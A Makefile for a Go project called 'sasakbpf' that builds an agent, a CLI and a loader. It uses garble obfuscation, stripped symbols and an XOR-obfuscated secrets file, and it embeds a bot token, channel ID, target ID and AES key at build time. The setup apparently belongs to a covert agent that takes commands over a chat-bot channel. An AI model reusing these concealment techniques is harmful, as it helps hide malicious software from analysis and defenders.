SHELL := /bin/bash
GOCACHE ?= $(shell go env GOCACHE)
GOOS   ?= linux
GOARCH ?= amd64
CGO    ?= 0
TRIM   := -trimpath
LDF    := -s -w
BIN    := bin

# garble obfuscator (optional; requires Go 1.26+).
# Falls back to plain go build if garble is not in PATH or version-incompatible.
GARBLE_RAW := $(shell command -v garble 2>/dev/null)
GARBLE     := $(shell [ -n "$(GARBLE_RAW)" ] && $(GARBLE_RAW) build -n ./cmd/xorgen >/dev/null 2>&1 && echo "$(GARBLE_RAW)" || true)
OBFUSCATE_TAGS := obfuscate

# LDFLAGS_SECRETS is the legacy ldflags injection — still supported
# for manual builds without -tags obfuscate. The standard Makefile
# targets below use xorgen + -tags obfuscate instead.
LDFLAGS_SECRETS := $(LDF) -X 'sasakbpf/internal/config.ldBotToken=$(SD_BOT_TOKEN)' \
           -X 'sasakbpf/internal/config.ldChannelID=$(SD_CHANNEL_ID)' \
           -X 'sasakbpf/internal/config.ldTargetID=$(SD_TARGET_ID)' \
           -X 'sasakbpf/internal/config.ldAESKeyHex=$(SD_AES_KEY_HEX)'

LDFLAGS_SELF  = $(LDF) -X 'sasakbpf/internal/config.ldSelf=$(SELF)'

# build_cmd returns garble with obfuscation flags if available, else plain go.
# Usage: $(call build_cmd) build ...
define build_cmd
$(if $(GARBLE),$(GARBLE) -literals -tiny,go)
endef

# build_flags returns go build flags common to obfuscated targets.
define build_flags
-tags $(OBFUSCATE_TAGS) $(TRIM) -ldflags "$(LDFLAGS_SELF)"
endef

.PHONY: all agent cli cli-darwin cli-all sd-loader test clean fmt vet xorgen

all: agent cli sd-loader

# ── obfuscated targets (agent, cli) ─────────────────────────────

agent: SELF := agent
agent: xorgen $(BIN)
	GOOS=$(GOOS) GOARCH=$(GOARCH) CGO_ENABLED=$(CGO) \
	  $(call build_cmd) build $(call build_flags) \
	  -o $(BIN)/agent ./cmd/agent

cli: SELF := cli
cli: xorgen $(BIN)
	GOOS=$(GOOS) GOARCH=$(GOARCH) CGO_ENABLED=$(CGO) \
	  $(call build_cmd) build $(call build_flags) \
	  -o $(BIN)/cli ./cmd/cli

cli-darwin: SELF := cli
cli-darwin: xorgen $(BIN)
	GOOS=darwin GOARCH=$(GOARCH) CGO_ENABLED=$(CGO) \
	  $(call build_cmd) build $(call build_flags) \
	  -o $(BIN)/cli-darwin ./cmd/cli

cli-all: cli cli-darwin

# ── sd-loader (no secrets, no obfuscation) ─────────────────────

sd-loader: $(BIN)
	GOOS=$(GOOS) GOARCH=$(GOARCH) CGO_ENABLED=$(CGO) \
	  go build $(TRIM) -ldflags "$(LDF) -X sasakbpf/internal/config.ldSelf=sd-loader" \
	  -o $(BIN)/sd-loader ./cmd/sd-loader

# ── xorgen: generate XOR-obfuscated secrets file ───────────────

SECRETS_FILE := internal/config/secrets_obfuscated.go

xorgen:
	go run ./cmd/xorgen -out ./$(SECRETS_FILE)

# ── legacy: build without obfuscation (ldflags fallback) ──────

agent-legacy: SELF := agent
agent-legacy: $(BIN)
	GOOS=$(GOOS) GOARCH=$(GOARCH) CGO_ENABLED=$(CGO) \
	  go build $(TRIM) -ldflags "$(LDFLAGS_SECRETS) -X sasakbpf/internal/config.ldSelf=$(SELF)" \
	  -o $(BIN)/agent ./cmd/agent

cli-legacy: SELF := cli
cli-legacy: $(BIN)
	GOOS=$(GOOS) GOARCH=$(GOARCH) CGO_ENABLED=$(CGO) \
	  go build $(TRIM) -ldflags "$(LDFLAGS_SECRETS) -X sasakbpf/internal/config.ldSelf=$(SELF)" \
	  -o $(BIN)/cli ./cmd/cli

# ── utilities ─────────────────────────────────────────────────

$(BIN):
	mkdir -p $(BIN)

test:
	CGO_ENABLED=0 go test ./...

fmt:
	go fmt ./...

vet:
	go vet ./...

clean:
	rm -rf $(BIN) $(SECRETS_FILE)
